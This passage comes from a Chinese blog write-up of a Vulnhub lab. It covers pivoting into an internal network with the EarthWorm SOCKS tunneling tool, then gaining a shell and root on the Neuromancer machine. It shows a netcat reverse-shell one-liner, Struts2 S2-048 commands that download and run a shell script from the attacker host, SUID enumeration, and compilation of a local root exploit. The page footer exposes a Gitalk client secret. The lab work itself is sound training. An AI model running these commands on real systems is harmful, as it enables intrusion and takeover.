class="line"><span class="string">这条命令的作用是，靶机A通过连接攻击机的反向代理端口（9999），将流量转发到靶机B的目标端口（8888）。也就是说，靶机A既连接到攻击机的代理服务，又通过该连接与靶机B建立通信。这种操作可能用于通过攻击机和靶机A的中介，访问或控制靶机B。</span></span><br><span class="line"></span><br><span class="line"><span class="string">总结</span></span><br><span class="line"><span class="string">这些命令的整体流程描述了一个典型的</span> <span class="string">端口转发</span> <span class="string">和</span> <span class="string">代理链路</span> <span class="string">的设置：</span></span><br><span class="line"></span><br><span class="line"><span class="string">攻击机通过</span> <span class="string">-s</span> <span class="string">lcx_listen</span> <span class="string">监听端口</span> <span class="number">1101</span> <span class="string">并将流量转发到</span> <span class="number">8888</span> <span class="string">端口。</span></span><br><span class="line"><span class="string">靶机A配置为一个</span> <span class="string">正向代理，监听端口</span> <span class="number">9999</span><span class="string">（即通过</span> <span class="string">SOCKS</span> <span class="string">代理）。</span></span><br><span class="line"><span class="string">靶机A同时充当</span> <span class="string">代理从属，连接攻击机的反向代理端口和靶机B的目标端口（8888）。</span></span><br><span class="line"><span class="string">这种结构可以用于将流量从攻击机通过靶机A进行转发，最终达到对靶机B的访问或控制。它可能是</span> <span class="string">渗透测试</span> <span class="string">或</span> <span class="string">攻击链</span> <span class="string">中的一个环节，用于在不同网络环境中穿透防火墙或其他安全措施。</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">官方给的readme.txt</span><br><span class="line">【使用场景】</span><br><span class="line"></span><br><span class="line">    普通网络环境：</span><br><span class="line">        <span class="number">1</span>.  目标网络边界存在公网<span class="type">IP</span>且可任意开监听端口：</span><br><span class="line"></span><br><span class="line">                  +---------+     +-------------------+  </span><br><span class="line">                  |<span class="type">HackTools</span>| -&gt;&gt; | <span class="number">8888</span>-&gt;  <span class="number">1.1</span>.<span class="number">1.1</span>   |</span><br><span class="line">                  +---------+     +-------------------+</span><br><span class="line"></span><br><span class="line">                a)./ew -s ssocksd -l <span class="number">8888</span></span><br><span class="line">                        // 在 <span class="number">1.1</span>.<span class="number">1.1</span> 主机上通过这个命令开启 <span class="number">8888</span> 端口的 socks 代理</span><br><span class="line">                b) <span class="type">HackTools</span> 可通过访问 <span class="number">1.1</span>.<span class="number">1.1</span>:<span class="number">8888</span> 端口使用 <span class="number">1.1</span>.<span class="number">1.1</span> 主机提供的代理</span><br><span class="line">                    </span><br><span class="line">        <span class="number">2</span>.  目标网络边界不存在公网 <span class="type">IP</span>，需要通过反弹方式创建 socks 代理</span><br><span class="line">            </span><br><span class="line">                                        一台可控公网<span class="type">IP</span>主机                  可控内网主机</span><br><span class="line">                  +---------+     +--------------------------+    |     +---------------+</span><br><span class="line">                  |<span class="type">HackTools</span>| -&gt;&gt; | <span class="number">1080</span> -&gt;  <span class="number">1.1</span>.<span class="number">1.1</span> -&gt; <span class="number">8888</span> |  防火墙  | &lt;--  <span class="number">2.2</span>.<span class="number">2.2</span>  |</span><br><span class="line">                  +---------+     +--------------------------+    |     +---------------+</span><br><span class="line"></span><br><span class="line">                a) ./ew -s rcsocks -l <span class="number">1080</span> -e <span class="number">8888</span></span><br><span class="line">                            // 在 <span class="number">1.1</span>.<span class="number">1.1</span> 的公网主机添加转接隧道，将 <span class="number">1080</span> 收到的代理请求转交给反连 <span class="number">8888</span> 端口的主机</span><br><span class="line">                b) ./ew -s rssocks -d <span class="number">1.1</span>.<span class="number">1.1</span> -e <span class="number">8888</span>          </span><br><span class="line">                            // 将目标网络的可控边界主机反向连接公网主机</span><br><span class="line"></span><br><span class="line">                c) <span class="type">HackTools</span> 可通过访问 <span class="number">1.1</span>.<span class="number">1.1</span>:<span class="number">1080</span> 端口使用 rssocks 主机提供的 socks5 代理服务</span><br><span class="line"></span><br><span class="line">    对于二重网络环境：        </span><br><span class="line">        <span class="number">1</span>.  获得目标网络内两台主机 <span class="type">A</span>、<span class="type">B</span> 的权限，情况描述如下：</span><br><span class="line"></span><br><span class="line">                <span class="type">A</span> 主机：  存在公网 <span class="type">IP</span>，且自由监听任意端口，无法访问特定资源</span><br><span class="line">                <span class="type">B</span> 主机：  目标网络内部主机，可访问特定资源，但无法访问公网</span><br><span class="line">                <span class="type">A</span> 主机可直连 <span class="type">B</span> 主机</span><br><span class="line">                </span><br><span class="line">                                        可控边界主机<span class="type">A</span>             可访问指定资源的主机<span class="type">B</span></span><br><span class="line">                  +---------+     +-----------------------+      +-----------------+</span><br><span class="line">                  |<span class="type">HackTools</span>| -&gt;&gt; | <span class="number">1080</span> --&gt;  <span class="number">2.2</span>.<span class="number">2.2</span> --&gt; | -&gt;&gt;  | <span class="number">9999</span> -&gt; <span class="number">2.2</span>.<span class="number">2.3</span> |</span><br><span class="line">                  +---------+     +-----------------------+      +-----------------+</span><br><span class="line"></span><br><span class="line">                a)  ./ew -s ssocksd -l <span class="number">9999</span></span><br><span class="line">                        // 在 <span class="number">2.2</span>.<span class="number">2.3</span> 主机上利用 ssocksd 方式启动 <span class="number">9999</span> 端口的 socks 代理</span><br><span class="line">                b)  ./ew -s lcx_tran -l <span class="number">1080</span> -f <span class="number">2.2</span>.<span class="number">2.3</span> -g <span class="number">9999</span> </span><br><span class="line">                        // 将 <span class="number">1080</span> 端口收到的 socks 代理请求转交给 <span class="number">2.2</span>.<span class="number">2.3</span> 的主机。</span><br><span class="line">                c)  <span class="type">HackTools</span> 可通过访问 <span class="number">2.2</span>.<span class="number">2.2</span>:<span class="number">1080</span> 来使用 <span class="number">2.2</span>.<span class="number">2.3</span> 主机提供的 socks5 代理。</span><br><span class="line">                </span><br><span class="line">        <span class="number">2</span>.  获得目标网络内两台主机 <span class="type">A</span>、<span class="type">B</span> 的权限，情况描述如下：</span><br><span class="line"></span><br><span class="line">                <span class="type">A</span> 主机：  目标网络的边界主机，无公网 <span class="type">IP</span>，无法访问特定资源。</span><br><span class="line">                <span class="type">B</span> 主机：  目标网络内部主机，可访问特定资源，却无法回连公网。</span><br><span class="line"></span><br><span class="line">                <span class="type">A</span> 主机可直连 <span class="type">B</span> 主机</span><br><span class="line">                                      一台可控公网<span class="type">IP</span>主机                    可控内网主机<span class="type">A</span>         可访问指定资源的主机<span class="type">B</span></span><br><span class="line">                  +---------+     +--------------------------+    |    +-----------------+      +-----------------+</span><br><span class="line">                  |<span class="type">HackTools</span>| -&gt;&gt; | <span class="number">1080</span> -&gt;  <span class="number">1.1</span>.<span class="number">1.1</span> -&gt; <span class="number">8888</span> |  防火墙  | &lt;--  <span class="number">2.2</span>.<span class="number">2.2</span> --&gt; | -&gt;&gt; | <span class="number">9999</span> -&gt; <span class="number">2.2</span>.<span class="number">2.3</span> |</span><br><span class="line">                  +---------+     +--------------------------+    |    +-----------------+      +-----------------+</span><br><span class="line"></span><br><span class="line">                a)  ./ew -s lcx_listen -l <span class="number">1080</span> -e <span class="number">8888</span></span><br><span class="line">                            // 在 <span class="number">1.1</span>.<span class="number">1.1</span> 公网主机添加转接隧道，将 <span class="number">1080</span> 收到的代理请求</span><br><span class="line">                            // 转交给反连 <span class="number">8888</span> 端口的主机</span><br><span class="line">                b)  ./ew -s ssocksd -l <span class="number">9999</span></span><br><span class="line">                            // 在 <span class="number">2.2</span>.<span class="number">2.3</span> 主机上利用 ssocksd 方式启动 <span class="number">9999</span> 端口的 socks 代理</span><br><span class="line">                c)  ./ew -s lcx_slave -d <span class="number">1.1</span>.<span class="number">1.1</span> -e <span class="number">8888</span> -f <span class="number">2.2</span>.<span class="number">2.3</span> -g <span class="number">9999</span></span><br><span class="line">                            // 在 <span class="number">2.2</span>.<span class="number">2.2</span> 上，通过工具的 lcx_slave 方式，打通<span class="number">1.1</span>.<span class="number">1.1</span>:<span class="number">8888</span> 和 <span class="number">2.2</span>.<span class="number">2.3</span>:<span class="number">9999</span> 之间的通讯隧道</span><br><span class="line">                d)  <span class="type">HackTools</span> 可通过访问 <span class="number">1.1</span>.<span class="number">1.1</span>:<span class="number">1080</span> 来使用 <span class="number">2.2</span>.<span class="number">2.3</span> 主机提供的 socks5 代理</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">【参数说明】</span><br><span class="line"></span><br><span class="line">    目前工具提供六种链路状态，可通过 -s 参数进行选定，分别为:</span><br><span class="line"></span><br><span class="line">        ssocksd   rcsocks   rssocks   </span><br><span class="line">        lcx_slave lcx_tran  lcx_listen</span><br><span class="line"></span><br><span class="line">        其中 <span class="type">SOCKS5</span> 服务的核心逻辑支持由 ssocksd 和 rssocks 提供，分别对应正向与反向socks代理。</span><br><span class="line"></span><br><span class="line">        其余的 lcx 链路状态用于打通测试主机同 socks 服务器之间的通路。</span><br><span class="line">    </span><br><span class="line">    lcx 类别管道：</span><br><span class="line"></span><br><span class="line">        lcx_slave  该管道一侧通过反弹方式连接代理请求方，另一侧连接代理提供主机。</span><br><span class="line">        lcx_tran   该管道，通过监听本地端口接收代理请求，并转交给代理提供主机。</span><br><span class="line">        lcx_listen 该管道，通过监听本地端口接收数据，并将其转交给目标网络回连的代理提供主机。</span><br><span class="line">    </span><br><span class="line">        通过组合lcx类别管道的特性，可以实现多层内网环境下的渗透测试。</span><br><span class="line"></span><br><span class="line">        下面是一个三级跳的本地测试例子。。。</span><br><span class="line">        ./ew -s rcsocks -l <span class="number">1080</span> -e <span class="number">8888</span></span><br><span class="line">        ./ew -s lcx_slave -d <span class="number">127.0</span>.<span class="number">0.1</span> -e <span class="number">8888</span> -f <span class="number">127.0</span>.<span class="number">0.1</span> -g <span class="number">9999</span></span><br><span class="line">        ./ew -s lcx_listen -l <span class="number">9999</span> -e <span class="number">7777</span></span><br><span class="line">        ./ew -s rssocks -d <span class="number">127.0</span>.<span class="number">0.1</span> -e <span class="number">7777</span></span><br><span class="line"></span><br><span class="line">        数据流向为   <span class="type">IE</span> -&gt; <span class="number">1080</span> -&gt; <span class="number">8888</span> -&gt; <span class="number">9999</span> -&gt; <span class="number">7777</span> -&gt; rssocks </span><br><span class="line"></span><br><span class="line">【补充说明】</span><br><span class="line">        <span class="number">1</span>.为了减少网络资源的消耗，程序中添加了超时机制，默认时间为<span class="number">10000</span>毫秒（<span class="number">10</span>秒），</span><br><span class="line">          用户可以通过追加 -t 参数来调整这个值，单位为毫秒。在多级级联功能中，超时机制</span><br><span class="line">          将以隧道中最短的时间为默认值。</span><br><span class="line">        <span class="number">2</span>.单纯从设计原理上讲，多级级联的三种状态可以转发任意以<span class="type">TCP</span>为基础的通讯服务，</span><br><span class="line">          包括远程桌面／web服务 等。</span><br><span class="line">        <span class="number">3</span>.产品包中的 ew_for_Arm32 在开发者已有平台下（android手机、小米路由器、树莓派） 测试无误。</span><br><span class="line">          如果有其它异常环境请将对应详细细节反馈给作者，以便更新程序问题。</span><br><span class="line"></span><br><span class="line">【联系作者】</span><br><span class="line"></span><br><span class="line">    rootkiter@rootkiter.com</span><br><span class="line">    如果您在使用中有什么好想法，或遇到什么<span class="type">BUG</span>，都可以主动联系我。</span><br><span class="line">    我会尽最大所能让这个工具更加完美，感谢大家的支持。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">回归正题，对于二层内网设备Wintermute<span class="punctuation">-</span>Neuromancer的渗透测试进行不了了，很遗憾，这台机器的网卡出现了问题。各位师傅需要移步其他前辈的博客学习struts2 s2<span class="punctuation">-</span><span class="number">048</span>的远程命令执行。我这里最后补充一点内核信息收集的命令，以及最后对Ubuntu <span class="number">16.04</span>.<span class="number">4</span> 本地提权时我建议在攻击机环境对<span class="built_in">exp</span>进行静态编译</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">内核、系统信息查询</span><br><span class="line"><span class="built_in">uname</span> -a    打印所有可用的系统信息</span><br><span class="line"><span class="built_in">uname</span> -r    内核版本</span><br><span class="line"><span class="built_in">uname</span> -n    系统主机名。</span><br><span class="line"><span class="built_in">uname</span> -m    查看系统内核架构（64位/32位）</span><br><span class="line">hostname    系统主机名</span><br><span class="line"><span class="built_in">cat</span> /proc/version    内核信息</span><br><span class="line"><span class="built_in">cat</span> /etc/*-release   分发信息</span><br><span class="line"><span class="built_in">cat</span> /etc/issue       分发信息</span><br><span class="line"><span class="built_in">cat</span> /proc/cpuinfo    CPU信息</span><br><span class="line"><span class="built_in">cat</span> /etc/lsb-release <span class="comment"># Debian </span></span><br><span class="line"><span class="built_in">cat</span> /etc/redhat-release <span class="comment"># Redhat</span></span><br><span class="line"><span class="built_in">ls</span> /boot | grep vmlinuz-</span><br><span class="line"></span><br><span class="line">可提权SUID查询；</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="getshell-1"><a href="#getshell-1" class="headerlink" title="getshell"></a>getshell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">rm</span> /tmp/f;<span class="built_in">mkfifo</span> /tmp/f; <span class="built_in">cat</span> /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.1.240 1005 &gt;/tmp/f   //shell.sh文件内容</span><br><span class="line"></span><br><span class="line">python struts2s2-048.py http://192.168.56.8:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action<span class="string">&quot;wget http://192.168.1.240:8000/shell.sh -O /tmp/shell.sh&quot;</span>  //远程执行命令下载shell</span><br><span class="line"></span><br><span class="line">python struts2s2-048.py http://192.168.56.8:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action<span class="string">&quot;chmod +x /tmp/shell.sh&quot;</span></span><br><span class="line">攻击机监听1005端口，Neuromancer靶机执行刚刚上传的shell</span><br><span class="line">python struts2s2-048.py http://192.168.56.8:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action<span class="string">&quot;sh /tmp/shell.sh&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h3><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -static -o <span class="keyword">shell</span><span class="language-bash"> 44298.c  静态链接的程序包含了所有的库文件，因此即使系统中没有所需版本的 GLIBC，也能够正常运行。</span></span><br><span class="line">chmod +x <span class="keyword">shell</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">./shell</span></span><br></pre></td></tr></table></figure>
+
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="../tags/%E6%89%93%E9%9D%B6/"># 打靶</a>
+                    
+                        <a href="../tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"># 内网渗透</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="../vulnhub-20-neuromancer/">Vulnhub-20.Neuromancer</a>
+            
+            
+            <a class="next" rel="next" href="../misc-vmware-capacity-mismatch-for-disk%E9%94%99%E8%AF%AF%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/">MISC-VMware-capacity-mismatch-for-disk错误解决办法</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+
+    <div id="gitalk-container"></div>
+    
+<link rel="stylesheet" href="//unpkg.com/gitalk/dist/gitalk.css">
+<script src="//unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+      var gitalk = new Gitalk({
+        clientID: 'Ov23liYIgvRGmOua7FRQ',
+        clientSecret: '3771339a3942e824992a8e506a5da60cdaa45391',
+        repo: 'comment',
+        owner: 'G00d-R',
+        admin: 'G00d-R',
+        id: md5(location.pathname),      
+        labels: 'Gitalk'.split(',').filter(l => l),
+        perPage: 100,
+        pagerDirection: 'last',
+        createIssueManually: true,
+        distractionFreeMode: false
+      })
+      gitalk.render('gitalk-container')
+</script>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© G00d
+            
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<span class="site-uv">
+    >总访客量:
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>&nbsp;
+
+
+<span class="site-pv">
+    总访问量:
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>@
+</span>
+
+              
+              2022 - 2025
+
+            </span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
